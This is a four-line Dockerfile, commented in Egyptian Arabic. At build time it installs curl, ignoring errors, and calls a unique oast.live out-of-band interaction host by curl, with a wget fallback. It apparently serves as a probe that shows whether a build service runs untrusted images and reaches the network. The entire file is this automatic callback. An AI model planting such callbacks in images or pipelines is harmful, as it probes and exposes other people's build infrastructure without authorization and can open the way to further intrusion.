FROM alpine:latest
# محاولة تسطيب curl لو مش موجود (مع تجاهل الأخطاء)
RUN apk add --no-cache curl || true
# تنفيذ الاتصال
RUN curl http://docker.d5271pg3t4gi388a61s07y1juzwff11dt.oast.live || wget -qO- http://docker-wget.d5271pg3t4gi388a61s07y1juzwff11dt.oast.live
